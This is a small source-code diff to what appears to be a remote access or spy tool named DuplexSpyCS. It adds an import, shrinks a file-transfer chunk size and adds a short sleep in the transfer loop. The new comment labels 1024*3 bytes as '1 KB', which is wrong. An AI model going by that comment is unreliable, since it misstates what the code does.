@@ -16,6 +16,7 @@
 
 using ICSharpCode.TextEditor.Document;
 using Microsoft.Win32;
+using System.Collections.Concurrent;
 using System.Data;
 using System.Diagnostics;
 using System.Text;
@@ -1171,7 +1172,7 @@ namespace DuplexSpyCS
 
                 string filename = path[1];
                 string tgt_filename = Path.Combine(tgt_dir, Path.GetFileName(filename));
-                int chunk_size = 1024 * 5; //5KB
+                int chunk_size = 1024 * 3; //1 KB
 
                 using (FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read))
                 {
@@ -1209,6 +1210,8 @@ namespace DuplexSpyCS
                         }));
 
                         i++;
+
+                        Thread.Sleep(10);
                     }
                 }
             }
